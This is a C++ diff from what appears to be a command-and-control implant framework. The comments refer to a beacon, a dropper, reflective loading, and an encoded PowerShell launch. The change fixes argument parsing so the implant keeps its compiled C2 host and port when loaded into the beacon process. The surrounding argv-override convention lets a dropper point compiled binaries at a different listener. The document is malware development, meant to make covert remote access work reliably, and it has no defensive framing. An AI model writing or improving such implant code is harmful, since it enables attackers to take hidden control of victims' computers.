@@ -192,7 +192,30 @@ static int remote_main(int argc, char** argv) {
 
     // argv overrides (host port use_https) — same convention as the beacon,
     // so the dropper can point a compiled binary at a different listener.
+    //
+    // Reflective loading runs this image inside the beacon process, so the
+    // CRT sees the BEACON's command line ("powershell ... -NoP ... -Enc ..."),
+    // not a remote.exe invocation. Applying that blindly replaced the
+    // compiled C2 host with "-NoP" and the port with 0. Only apply argv when
+    // the first token actually looks like a host and, if supplied, the port
+    // is a real port. Otherwise keep the compiled C2 config.
+    bool apply_argv = false;
     if (argc >= 2) {
+        std::string host_str(argv[1]);
+        const std::string host_chars =
+            "abcdefghijklmnopqrstuvwxyz"
+            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+            "0123456789.-_:[]";
+        bool host_ok = !host_str.empty() && host_str.size() < 256 &&
+                       host_str[0] != '-' &&
+                       host_str.find_first_not_of(host_chars) == std::string::npos;
+        if (argc >= 3) {
+            int parsed_port = std::atoi(argv[2]);
+            host_ok = host_ok && parsed_port > 0 && parsed_port <= 65535;
+        }
+        apply_argv = host_ok;
+    }
+    if (apply_argv) {
         std::string host_str(argv[1]);
 #ifdef _WIN32
         cfg.host = std::wstring(host_str.begin(), host_str.end());
